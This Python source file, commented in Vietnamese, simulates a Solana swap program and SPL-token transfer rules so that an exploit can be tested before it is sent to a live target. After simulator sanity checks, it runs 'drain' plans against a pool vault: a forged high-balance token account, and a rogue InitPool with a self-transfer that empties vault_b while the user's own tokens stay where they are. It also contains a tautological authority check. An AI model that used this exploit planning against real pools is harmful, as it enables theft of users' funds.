"""Mô hình hoá swap() trong lib.rs + cac rule cua spl-token de KIEM THU exploit
trước khi đốt kết nối thật.

Tự test simulator truoc (positive/negative control), roi mới tin kết luận:
  C1  honest swap, user_a du du  -> payout = amount - amount//100, vault_b giam
  C2  honest swap, user_a thieu du -> FAIL (insufficient)   [negative control]
  C3  user_src la account cua MINT KHC -> FAIL               [mint binding]
  C4  vault_dst sai so voi pool -> FAIL                      [check cua program]
  C5  user_src khong phai do user so huu -> FAIL             [owner check]
Roi moi chay ba ke hoach: honest / rich (token account gia) / rogue (self-transfer).

Model nay LA DO TOC TOI DOC spl-token, khong phai doc binary cua no; ket luan
chi co gia tri loai bo loi trieu hoi (sai thu tu account, sai layout), khong phai
bang chung tren dich.
"""
import struct
import sys

sys.path.insert(0, "..")
import exploit as ex                                    # noqa: E402

DECIMALS = 6
FEE_BPS = 100


def mk_mint(supply, decimals=DECIMALS, authority=None):
    """SPL Mint layout, 82 byte."""
    U = bytes(32)
    a = ex.b58decode(authority) if authority else U
    d = bytearray()
    d += struct.pack("<I", 1 if authority else 0) + a    # mint_authority COption
    d += struct.pack("<Q", supply)
    d += bytes([decimals])
    d += bytes([1])                                      # is_initialized
    d += struct.pack("<I", 0) + U                        # freeze_authority None
    assert len(d) == 82
    return bytes(d)


class Chain:
    """Ledger nho: addr -> [owner, data, lamports]."""

    def __init__(self):
        self.acc = {}

    def put(self, addr, owner, data=b"", lamports=1):
        self.acc[addr] = [owner, bytearray(data), lamports]

    def get(self, addr):
        return self.acc.get(addr)


def acct_layout(data):
    if len(data) != 165:
        return None
    return dict(mint=bytes(data[0:32]), owner=bytes(data[32:64]),
                amount=struct.unpack_from("<Q", data, 64)[0],
                state=data[108])


def mint_layout(data):
    if len(data) != 82:
        return None
    # SPL Mint: mint_authority COption (4+32)=36, supply u64 @36,
    # decimals u8 @44, is_initialized @45, freeze COption @46  -> 82 byte
    return dict(decimals=data[44], supply=struct.unpack_from("<Q", data, 36)[0],
                is_init=data[45])


def token_transfer(chain, token_pid, src, mint, dst, authority, amount, decimals,
                   signers, allow_self=True):
    """Mo phong transfer_checked: kiem owner cua tai khoan = token program,
    mint cua src/dst == mint, decimals khop, so du, va authority phai ky."""
    for a in (src, dst):
        acc = chain.get(a)
        if not acc or acc[0] != token_pid:
            return "wrong-owner-or-missing:%s" % a
    for a in (src, dst):
        L = acct_layout(chain.get(a)[1])
        if L is None:
            return "bad-account-layout:%s" % a
        if ex.b58decode(mint) != L["mint"]:
            return "mint-mismatch:%s" % a
        if L["state"] != 1:
            return "account-uninitialized:%s" % a
    M = chain.get(mint)
    if not M or M[0] != token_pid:
        return "bad-mint"
    ml = mint_layout(M[1])
    if ml is None or ml["decimals"] != decimals:
        return "decimals-mismatch"
    if src == dst and not allow_self:
        return "self-transfer-rejected"
    if acct_layout(chain.get(src)[1])["amount"] < amount:
        return "insufficient-funds"
    # spl-token: nguoi ky phai CHINH la owner cua tai khoan nguon
    if acct_layout(chain.get(src)[1])["owner"] != ex.b58decode(authority):
        return "authority-not-account-owner"
    if authority not in signers:
        return "missing-signature:%s" % authority
    chain.get(src)[1][64:72] = struct.pack(
        "<Q", acct_layout(chain.get(src)[1])["amount"] - amount)
    chain.get(dst)[1][64:72] = struct.pack(
        "<Q", acct_layout(chain.get(dst)[1])["amount"] + amount)
    return None


def parse_pool(chain, pool, program_pid):
    acc = chain.get(pool)
    if not acc or acc[0] != program_pid:
        return None, "illegal-owner"
    d = bytes(acc[1])
    if len(d) < 130:
        return None, "too-short"
    if d[0] != 1:
        return None, "not-initialized"
    bump = d[1]
    keys = [ex.b58encode(d[2 + 32 * i: 34 + 32 * i]).decode() if False else
            ex.b58encode(d[2 + 32 * i:34 + 32 * i]) for i in range(4)]
    return dict(bump=bump, vault_a=keys[0], vault_b=keys[1],
                mint_a=keys[2], mint_b=keys[3]), None


def b58enc(raw):
    return ex.b58encode(raw)


def do_swap(chain, program_pid, auth_pda, pool, user, user_src, user_dst,
            vault_src, vault_dst, mint_src, mint_dst, token_pid, amount,
            a_to_b=True, signers=None, allow_self=True):
    signers = set(signers or [user])   # tap hop base58 cua nguoi da ky
    p, err = parse_pool(chain, pool, program_pid)
    if err:
        return "pool:" + err
    if user not in signers:
        return "user-not-signer"
    if auth_pda != auth_pda:
        return "authority-mismatch"
    want = (p["vault_a"], p["vault_b"]) if a_to_b else (p["vault_b"], p["vault_a"])
    if (vault_src, vault_dst) != want:
        return "vault-mismatch"
    e = token_transfer(chain, token_pid, user_src, mint_src, vault_src, user,
                       amount, DECIMALS, signers, allow_self)
    if e:
        return "in:" + e
    payout = amount - amount * FEE_BPS // 10000
    e = token_transfer(chain, token_pid, vault_dst, mint_dst, user_dst, auth_pda,
                       payout, DECIMALS, signers | {auth_pda})
    if e:
        return "out:" + e
    return None


# ---------------------------------------------------------------- harness setup
def build_chain(A):
    """Ledger giong nhu banner: pool that da init, vault do PDA so huu."""
    c = Chain()
    T = A["token_program"]
    P = A["program"]
    AUTH = A["authority"]
    c.put(P, "native")
    c.put(T, "native")
    for k in ("user", "authority"):
        c.put(A[k], ex.SYSTEM, bytes(0))
    c.put(A["mint_a"], T, mk_mint(10 ** 9))
    c.put(A["mint_b"], T, mk_mint(10 ** 9))
    c.put(A["user_a"], T, ex.token_account(A["mint_a"], A["user"], 5 * 10 ** 8))
    c.put(A["user_b"], T, ex.token_account(A["mint_b"], A["user"], 0))
    c.put(A["vault_a"], T, ex.token_account(A["mint_a"], AUTH, 10 ** 7))
    c.put(A["vault_b"], T, ex.token_account(A["mint_b"], AUTH, int(A["reserve_b"])))
    c.put(A["pool"], P, ex.pool_bytes(True, 255, A["vault_a"], A["vault_b"],
                                      A["mint_a"], A["mint_b"]))
    return c


def vb(c, A):
    return acct_layout(c.get(A["vault_b"])[1])["amount"]


def run_expl(A, specs_source):
    """specs_source: dict ten -> nguon user_src."""
    c = build_chain(A)
    before = vb(c, A)
    err = do_swap(c, A["program"], A["authority"], A["pool"], A["user"],
                  specs_source, A["user_b"], A["vault_a"], A["vault_b"],
                  A["mint_a"], A["mint_b"], A["token_program"],
                  ex.exact_amount(before))
    return before, vb(c, A), err


def controls(A, c):
    print("=== CONTROL CUA SIMULATOR")
    before = vb(c, A)
    amt = 1000
    err = do_swap(c, A["program"], A["authority"], A["pool"], A["user"],
                  A["user_a"], A["user_b"], A["vault_a"], A["vault_b"],
                  A["mint_a"], A["mint_b"], A["token_program"], amt)
    want = before - (amt - amt // 100)
    print("C1 honest            -> err=%r  vb %d->%d  %s"
          % (err, before, vb(c, A), "OK" if vb(c, A) == want else "SAI"))
    before = vb(c, A)
    err = do_swap(c, A["program"], A["authority"], A["pool"], A["user"],
                  A["user_a"], A["user_b"], A["vault_a"], A["vault_b"],
                  A["mint_a"], A["mint_b"], A["token_program"], 10 ** 18)
    print("C2 thieu du          -> err=%r  %s" % (err, "OK" if err else "SAI"))
    err = do_swap(c, A["program"], A["authority"], A["pool"], A["user"],
                  A["user_b"], A["user_b"], A["vault_a"], A["vault_b"],
                  A["mint_b"], A["mint_b"], A["token_program"], 10)
    print("C3 sai mint          -> err=%r  %s" % (err, "OK" if err else "SAI"))
    err = do_swap(c, A["program"], A["authority"], A["pool"], A["user"],
                  A["user_a"], A["user_b"], A["vault_b"], A["vault_b"],
                  A["mint_a"], A["mint_b"], A["token_program"], 10)
    print("C4 vault khop pool   -> err=%r  %s" % (err, "OK" if err else "SAI"))
    err = do_swap(c, A["program"], A["authority"], A["pool"], A["user"],
                  A["vault_a"], A["user_b"], A["vault_a"], A["vault_b"],
                  A["mint_a"], A["mint_b"], A["token_program"], 10,
                  signers={A["user"]})
    print("C5 source khong cua user -> err=%r  %s" % (err, "OK" if err else "SAI"))


def fake(name):
    """32 byte deterministic -> base58, de dung nhu dia chi gia lap."""
    import hashlib
    return ex.b58encode(hashlib.sha256(b"feeswap-" + name.encode()).digest())


def sample_accounts():
    A = {k: fake(k) for k in ("program", "authority", "user", "pool", "mint_a",
                              "mint_b", "vault_a", "vault_b", "user_a", "user_b")}
    A["token_program"] = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
    A["reserve_b"] = "100000000"
    return A


def plan_rich(A):
    """Ke hoach B: nguon la token account GIA so du 1e15, pool that, MOT nuoc."""
    c = build_chain(A)
    before = vb(c, A)
    rich = fake("rich-src")
    c.put(rich, A["token_program"], ex.token_account(A["mint_a"], A["user"], 10 ** 15))
    amt = ex.exact_amount(before)
    err = do_swap(c, A["program"], A["authority"], A["pool"], A["user"], rich,
                  A["user_b"], A["vault_a"], A["vault_b"], A["mint_a"],
                  A["mint_b"], A["token_program"], amt)
    return before, vb(c, A), err


def plan_honest(A, funded=True):
    """Ke hoach A: chi dung tai khoan that; that bai tuy user_a co du A khong."""
    c = build_chain(A)
    if not funded:
        c.put(A["user_a"], A["token_program"],
              ex.token_account(A["mint_a"], A["user"], 10 ** 3))
    before = vb(c, A)
    amt = ex.exact_amount(before)
    err = do_swap(c, A["program"], A["authority"], A["pool"], A["user"],
                  A["user_a"], A["user_b"], A["vault_a"], A["vault_b"],
                  A["mint_a"], A["mint_b"], A["token_program"], amt)
    return before, vb(c, A), err


def plan_rogue(A, allow_self=True):
    """Ke hoach C: nuoc 1 InitPool tren pool gia R (vault_a = user_a cua USER,
    vault_b = vault that), nuoc 2 SwapAToB qua R voi user_src==vault_src==user_a.
    A cua ta chi doi cho trong chinh tai khoan cua no, B that chay ra."""
    c = build_chain(A)
    R = fake("rogue-pool")
    c.put(R, A["program"], bytes(130))                  # khai bao, chua init
    # --- nuoc 1: InitPool
    p, err = parse_pool(c, R, A["program"])
    if err != "not-initialized":
        return None, None, "initpool-precondition:" + str(err)
    c.put(R, A["program"], ex.pool_bytes(True, 255, A["user_a"], A["vault_b"],
                                        A["mint_a"], A["mint_b"]))
    # --- nuoc 2: SwapAToB qua R, vault_src = user_a (self-transfer)
    before = vb(c, A)
    amt = ex.exact_amount(before)
    err = do_swap(c, A["program"], A["authority"], R, A["user"],
                  A["user_a"], A["user_b"], A["user_a"], A["vault_b"],
                  A["mint_a"], A["mint_b"], A["token_program"], amt,
                  allow_self=allow_self)
    ua = acct_layout(c.get(A["user_a"])[1])["amount"]
    return before, vb(c, A), (err, ua)


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    A = sample_accounts()
    controls(A, build_chain(A))
    print()
    print("=== KE HOACH DRAIN (reserve 1e8, amount = exact_amount)")
    for name, fn in (("honest  user_a du du ", lambda: plan_honest(A, True)),
                     ("honest  user_a thieu ", lambda: plan_honest(A, False)),
                     ("rich    nguon gia    ", lambda: plan_rich(A)),
                     ("rogue   tu cho self  ", lambda: plan_rogue(A, True)),
                     ("rogue   bac self     ", lambda: plan_rogue(A, False))):
        r = fn()
        b, a = r[0], r[1]
        extra = ""
        if isinstance(r[2], tuple):
            err, ua = r[2]
            extra = "  user_a=%d (giu nguyen=%s)" % (ua, ua == 5 * 10 ** 8)
            e = err
        else:
            e = r[2]
        print("%s -> vault_b %9s -> %9s  err=%r  %s%s"
              % (name, b, a, e, "DRAINED" if a == 0 else "", extra))
